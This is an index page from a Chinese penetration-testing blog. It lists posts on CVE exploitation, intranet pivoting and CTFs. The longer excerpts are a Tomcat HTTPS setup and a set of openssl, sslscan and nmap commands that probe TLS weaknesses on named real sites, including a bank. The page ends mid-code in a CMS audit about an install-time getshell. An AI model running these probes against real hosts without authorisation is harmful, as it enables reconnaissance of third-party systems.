<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta content="倾旋的博客" property="og:site_name">

  <meta content="倾旋的博客" property="og:title">


  <meta content="website" property="og:type">


  <meta content="<h1 style='color:white;'>倾旋的博客</h1><h3>岁月静好，现世安稳。</h3>" property="og:description">


  <meta content="http://localhost:4000/" property="og:url">



  <meta property="og:image" content="">



  <title>倾旋的博客</title>
  <meta name="description" content="<h1 style='color:white;'>倾旋的博客</h1><h3>岁月静好，现世安稳。</h3>">
<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
</head>


  <body>

<section>
<nav class="navbar navbar-default navbar-fixed-top">

  <div class="container">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">倾旋的博客</a>
    </div>


    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        
        
        <li><a href="/about/">关于我</a></li>

        

        
        
        <li><a href="/category/">文章分类</a></li>

        

        
        

        
        

        
        

        
        
        <li><a href="/other/">其他信息</a></li>

        

        


      </ul>

    <!--  <ul class="nav navbar-nav navbar-right">
        <li><a href="#">Know More!</a></li>

      </ul>-->
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>
</section>

<section>
<section>
  <div class="jumbotron">
    <div class="container">
      <h1 style='color:white;'>倾旋的博客</h1><h3>岁月静好，现世安稳。</h3>

    </div>

</div>
</section>

<section id="page-content">
  <div class="container">
    <div class="post-list">
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-28/1" > C++/C实现DNS查询</a>
    </div>
    <div class="post-excerpt">
      本文简述一下使用C++/C发送A记录的DNS数据请求程序的开发过程。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Sunday, February 18, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-11/1" > 无聊写个C语言创建Jekyll文章的程序</a>
    </div>
    <div class="post-excerpt">
      记录一下写的这个程序
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Sunday, February 11, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        高效 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-10/1" > DNS协议编程</a>
    </div>
    <div class="post-excerpt">
      本文总结一下自己写原生DNS客户端的过程。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Saturday, February 10, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-07/1" > 关于CVE-2018-6580其他Tips分析</a>
    </div>
    <div class="post-excerpt">
      本文分析一下CVE-2018-6580漏洞的产生原因
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, February 7, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        CVE漏洞分析 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-05/1" > Fuzzing With FuzzDB to Web Attack</a>
    </div>
    <div class="post-excerpt">
      本文介绍一个使用FUZZDB在Web环境下的测试方法
<!--more-->
<h2 id="0x01-前言">0x01 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, February 5, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        fuzz &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-02/1" > 内网渗透常见端口转发方式</a>
    </div>
    <div class="post-excerpt">
      本篇文章主要是总结一下常见端口转发姿势。
<!--more-->
<h2 id="0x01-前言">0x01 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, February 2, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-02-01/1" > Metasploit - MS17010通用模块</a>
    </div>
    <div class="post-excerpt">
      本篇文章主要是演示通用模块的安装及使用。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, February 1, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-01-25/1" > 从网络扼杀Metasploit木马</a>
    </div>
    <div class="post-excerpt">
      本篇文章主要记录一下自己的网络分析过程，以及总结一下网络分析相关的技术点。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, January 25, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-01-23/1" > 封装好的CURL class 尽情享用</a>
    </div>
    <div class="post-excerpt">
      本篇文章主要是记录一下使用CURL的坑
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Tuesday, January 23, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-01-30/1" > 针对某跨国企业的一次渗透测试-持续</a>
    </div>
    <div class="post-excerpt">
      文章涉及泄漏厂商隐私，已经删除！
<!--more-->

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, January 22, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-01-22/1" > 我的丽江之旅</a>
    </div>
    <div class="post-excerpt">
      记录一下我眼中的丽江，不以叙事风格来写，只写我印象最深的它。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, January 22, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        生活 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2018-01-05/1" > Sqlmap tamper 总结</a>
    </div>
    <div class="post-excerpt">
      总结一下tamper
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, January 5, 2018
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        工具 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-12-28/1" > 针对国内一大厂的后渗透 - 持续</a>
    </div>
    <div class="post-excerpt">
      此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。
<!--more-->


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, December 28, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-12-06/1" > TP-LINK Shell调试后门浅析</a>
    </div>
    <div class="post-excerpt">
      本篇文章介绍一个TP-LINK低版本的一个调试后门
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, December 6, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        漏洞复现 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-22/1" > CVE-2017-11882钓鱼攻击</a>
    </div>
    <div class="post-excerpt">
      本文概述一次钓鱼攻击
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, November 22, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        CVE漏洞利用 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-21/1" > CVE-2017-11882漏洞复现</a>
    </div>
    <div class="post-excerpt">
      本文记录一下针对CVE-2017-11882的漏洞复现
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Tuesday, November 21, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        CVE漏洞复现 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-19/1" > C++ libghttp库</a>
    </div>
    <div class="post-excerpt">
      本文介绍一下C++下一个libghttp库的使用
<!--more-->
<h2 id="0x00-安装">0x00 安装</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Sunday, November 19, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-16/1" > 搭建Mattermost并开启Https</a>
    </div>
    <div class="post-excerpt">
      本文记录一下搭建Mattermost服务的过程
<!--more-->
<h2 id="0x00-简介">0x00 简介</h2>
Mattermost 是一个 Slack 的开源替代品。


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, November 16, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        高效 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-15/1" > 小型Web安全加固方案</a>
    </div>
    <div class="post-excerpt">
      本文介绍一下小型Web应用的加固方案，内容均为原创
<!--more-->
<h2 id="0x00-配置管理安全">0x00 配置管理安全</h2>
即使在存在某些高危漏洞的情况下，我们只要做好配置方面的安全加固即可防御许多攻击。


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, November 15, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        加固方案 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-14/1" > CTF - 美眉的手机号</a>
    </div>
    <div class="post-excerpt">
      本文介绍一个在CTF中遇到的经典二次注入
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Tuesday, November 14, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        CTF &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-13/1" > 高效-搭建一个Github静态博客</a>
    </div>
    <div class="post-excerpt">
      本文介绍一下如何在Github搭建一个静态博客
<!--more-->
<h2 id="0x00-环境准备">0x00 环境准备</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, November 13, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        高效 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/tools/socat" > socat 使用手册</a>
    </div>
    <div class="post-excerpt">
      从网上搜集的一篇比较好的文章。
<!--more-->
<h2 id="socat简介">socat简介</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, November 9, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-09/1" > DNS信息搜集工具小结</a>
    </div>
    <div class="post-excerpt">
      本文介绍几个DNS信息搜集工具的使用方法
<!--more-->
<h2 id="0x00-dnsrecon">0x00 dnsrecon</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, November 9, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        渗透测试 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-08/1" > Windows下命令行下载文件总结</a>
    </div>
    <div class="post-excerpt">
      Windows下命令行下载文件总结
<!--more-->
<h2 id="0x00-powershell">0x00 Powershell</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, November 8, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-11-08/2" > Kali Linux 优化</a>
    </div>
    <div class="post-excerpt">
      本文介绍几个优化Kali Linux的方式
<!--more-->
<h2 id="0x00-启动应用加速">0x00 启动应用加速</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, November 8, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        Kali &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-24/1" > C++调用CURL进行信息搜集</a>
    </div>
    <div class="post-excerpt">
      本文简述一下使用C++的libcurl库开发Web信息搜集工具的开发过程。 - 1024 快乐！！
<!--more-->
<h2 id="0x00-libcurl的安装">0x00 libcurl的安装</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Tuesday, October 24, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-23/2" > C语言读取文件</a>
    </div>
    <div class="post-excerpt">
      如何实现在C++中的getline函数
<!--more-->
<h2 id="0x00-问题">0x00 问题</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, October 23, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-23/1" > 一个暂时没有名字的项目</a>
    </div>
    <div class="post-excerpt">
      一个暂时没有名字的项目
<!--more-->
<h2 id="0x00-简介">0x00 简介</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, October 23, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        C++/C &nbsp;,
        
        渗透测试 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-12/1" > PHP代码审计技巧总结</a>
    </div>
    <div class="post-excerpt">
      本篇文章简述一下我的个人代码审计方面的技巧 技术不精勿喷 [+] 文章转载请注明出处
<!--more-->
<h2 id="0x00-与php的那些情缘">0x00 与PHP的那些情缘</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Friday, October 20, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        php &nbsp;,
        
        代码审计 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-17/2" > 使用C++操作Postgresql</a>
    </div>
    <div class="post-excerpt">
      本文简述一下近期想做的一个项目铺垫
<!--more-->
<h2 id="0x00-安装扩展库---libpqxx">0x00 安装扩展库 - libpqxx</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Wednesday, October 18, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        database &nbsp;,
        
        C++/C &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-10-17/1" > 折腾Postgresql数据库</a>
    </div>
    <div class="post-excerpt">
      最近学习C语言，突发奇想就想着造一些轮子吧，顺便复习一下C语言。
<!--more-->
<h2 id="0x00-安装数据库">0x00 安装数据库</h2>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Tuesday, October 17, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        database &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-21/1" > Tomcat 开启 https支持</a>
    </div>
    <div class="post-excerpt">
      本文介绍一下tomcat 开启 https支持
<!--more-->
<h2 id="0x00-配置keystore">0x00 配置keystore</h2>

要使用ssl connector，必须先创建一个keystore。他包含了服务器中被客户端用于验证服务器的数字证书。一旦客户端接受了这个证书，客户端就可以使用public key去加密他们要发送的数据。而服务器，拥有一个private key，作为唯一解密数据的密钥。

进入JDK环境的bin目录，调用keytool来完成我们的证书生成：

<code class="highlighter-rouge">keytool -genkey -alias tomcat -keyalg RSA</code>

<ul>
  <li>-genkey:创建一个public-private key pair</li>
  <li>-alias tomcat：用户别名为tomcat</li>
  <li>-keyalg RSA： 使用RSA算法。  MD5算法也是被支持的，但是建议使用RSA获得更好的兼容。</li>
</ul>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-21/0x00.jpg" alt="生成证书" />

生成证书后，此证书会被保存在当前用户主目录下。

<h2 id="0x01-修改配置文件">0x01 修改配置文件</h2>

找到tomcat目录下的<code class="highlighter-rouge">conf/server.xml</code>，将原来的<code class="highlighter-rouge">Connector </code>更改一下即可。

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--

    &lt;Connector port="8443" protocol="HTTP/1.1" SSLEnabled="true"

               maxThreads="150" scheme="https" secure="true"

               clientAuth="false" sslProtocol="TLS" /&gt;

    --&gt;</span>
</code></pre></div></div>

改成：

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Connector</span> <span class="na">port=</span><span class="s">"端口"</span> <span class="na">protocol=</span><span class="s">"org.apache.coyote.http11.Http11Protocol"</span>  
                <span class="na">maxThreads=</span><span class="s">"150"</span> <span class="na">SSLEnabled=</span><span class="s">"true"</span> <span class="na">scheme=</span><span class="s">"https"</span> <span class="na">secure=</span><span class="s">"true"</span>  
                <span class="na">clientAuth=</span><span class="s">"false"</span> <span class="na">sslProtocol=</span><span class="s">"TLS"</span>  
                <span class="na">keystoreFile=</span><span class="s">"keystore文件路径"</span>   
          <span class="na">keystorePass=</span><span class="s">"口令"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

重启tomcat后生效~

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, August 21, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        tomcat &nbsp;,
        
        https &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-21/2" > 几个扫描https漏洞的工具</a>
    </div>
    <div class="post-excerpt">
      总结几个扫描https漏洞的工具
<!--more-->
<h2 id="查看网站使用的证书">查看网站使用的证书</h2>

<code class="highlighter-rouge">openssl s_client -connect www.baidu.com:443</code>

<ul>
  <li>【s_client:作为一个客户端 -connect：连接 +服务器域名:端口】</li>
</ul>

<h2 id="测试是否支持某协议某低版本协议">测试是否支持某协议（某低版本协议）</h2>

<code class="highlighter-rouge">openssl s_client -tls1_2 -cipher 'ECDH-RSA-RC4-SHA' -connect www.taobao.com:443</code>

<h2 id="测试是否所有不安全的ciphers-suite都不支持">测试是否所有不安全的ciphers suite都不支持</h2>

<code class="highlighter-rouge">openssl s_client -tls1_2 -cipher "NULL,EXPORT,LOW,DES" -connect www.taobao.com:443</code>

<h2 id="查看目前可被破解的cipher-suiteopenssl">查看目前可被破解的cipher suite　　【openssl】</h2>

<code class="highlighter-rouge">openssl ciphers -v "NULL,EXPORT,LOW,DES"</code>

<h2 id="自动识别ssl配置错误过期协议过时cipher-suite-和hash算法">自动识别SSL配置错误、过期协议，过时cipher suite 和hash算法</h2>

<code class="highlighter-rouge">sslscan --tlsall www.taobao.com:443</code>

<h2 id="分析证书详细信息">分析证书详细信息</h2>

<code class="highlighter-rouge">sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code>

<h2 id="验证https相关漏洞">验证https相关漏洞</h2>

<table>
  <tbody>
    <tr>
      <td>受戒礼漏洞</td>
      <td>openssl s_client -connect zp.czbank.com.cn:443 -cipher RC4</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>贵宾犬漏洞</td>
      <td>openssl s_client -ssl3 -connect zp.czbank.com.cn:443</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>SSL中间人劫持</td>
      <td>openssl s_client -connect zp.czbank.com.cn:443 -cipher EXPORT</td>
    </tr>
  </tbody>
</table>

<h2 id="检查是否支持会话恢复">检查是否支持会话恢复</h2>

<code class="highlighter-rouge">sslyze --regular www.taobao.com:443</code>

<h2 id="namp枚举ssl脚本">NAMP枚举SSL脚本</h2>

<code class="highlighter-rouge">nmap --script=ssl-enum-ciphers.nse www.taobao.com</code>

<h2 id="在线网站">在线网站</h2>

https://www.ssllabs.com/ssltest

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, August 21, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        https &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-18/1" > 记一次某Cms的审计</a>
    </div>
    <div class="post-excerpt">
      本文简述一下对一个采用了开源框架的cms的审计过程。
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>

此套cms采用了CI框架，之前在做漏洞平台的时候也是用的这个框架开发。

CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。

文章写的比较急，以后再补充……

<h2 id="0x01-第一弹-安装程序getshell">0x01 第一弹 安装程序Getshell</h2>

首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。

CI框架的数据库配置在：<code class="highlighter-rouge">config\database.php</code>,其常见内容如下：

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'BASEPATH'</span><span class="p">))</span> <span class="k">exit</span><span class="p">(</span><span class="s1">'No direct script access allowed'</span><span class="p">);</span>

<span class="nv">$active_group</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
<span class="nv">$query_builder</span>  <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>

<span class="nv">$db</span><span class="p">[</span><span class="s1">'default'</span><span class="p">]</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
  <span class="s1">'hostname'</span>  <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
  <span class="s1">'username'</span>  <span class="o">=&gt;</span> <span class="s1">'root'</span><span class="p">,</span>
  <span class="s1">'password'</span>  <span class="o">=&gt;</span> <span class="s1">'root'</span><span class="p">,</span>
  <span class="s1">'port'</span>    <span class="o">=&gt;</span> <span class="s1">'3306'</span><span class="p">,</span>
  <span class="s1">'database'</span>  <span class="o">=&gt;</span> <span class="s1">'xxxxx'</span><span class="p">,</span>
  <span class="s1">'dbdriver'</span>  <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
  <span class="s1">'dbprefix'</span>  <span class="o">=&gt;</span> <span class="s1">'dr_'</span><span class="p">,</span>
  <span class="s1">'pconnect'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'db_debug'</span>  <span class="o">=&gt;</span> <span class="kc">true</span><span class="p">,</span>
  <span class="s1">'cache_on'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'cachedir'</span>  <span class="o">=&gt;</span> <span class="s1">'cache/sql/'</span><span class="p">,</span>
  <span class="s1">'char_set'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8'</span><span class="p">,</span>
  <span class="s1">'dbcollat'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8_general_ci'</span><span class="p">,</span>
  <span class="s1">'swap_pre'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
  <span class="s1">'autoinit'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'encrypt'</span> <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'compress'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'stricton'</span>  <span class="o">=&gt;</span> <span class="k">FALSE</span><span class="p">,</span>
  <span class="s1">'failover'</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
<span class="p">);</span>
</code></pre></div></div>

安装界面：
<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x00.jpg" alt="Install" />

然后找到这个界面对应的代码 <code class="highlighter-rouge">diy\dayrui\controllers\Install.php</code>：

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="sd">/**
     * 安装程序
     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span> <span class="p">{</span>

        <span class="nv">$step</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'step'</span><span class="p">));</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$step</span><span class="p">)</span> <span class="p">{</span>

            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>

                <span class="nv">$check_pass</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

                <span class="nv">$writeAble</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_checkFileRight</span><span class="p">();</span>
                <span class="nv">$lowestEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getLowestEnvironment</span><span class="p">();</span>
                <span class="nv">$currentEnvironment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getCurrentEnvironment</span><span class="p">();</span>
